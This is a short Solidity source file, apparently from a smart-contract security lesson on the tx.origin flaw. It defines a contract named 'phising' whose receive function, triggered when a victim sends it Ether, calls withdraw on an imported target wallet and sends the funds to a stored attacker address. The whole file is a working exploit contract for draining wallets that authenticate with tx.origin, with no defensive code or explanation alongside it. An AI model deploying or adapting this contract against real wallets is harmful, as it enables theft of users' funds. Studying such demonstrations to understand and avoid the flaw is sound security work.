// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "./txOrigin.sol";

contract phising{
    wallet public target;
    address attacker;

    constructor(address _target , address _attacker) {
        target = wallet(payable(_target));
        attacker = _attacker;
    }

    receive() external payable {
        target.withdraw(attacker); // This will call the withdraw function of the target contract
    }
}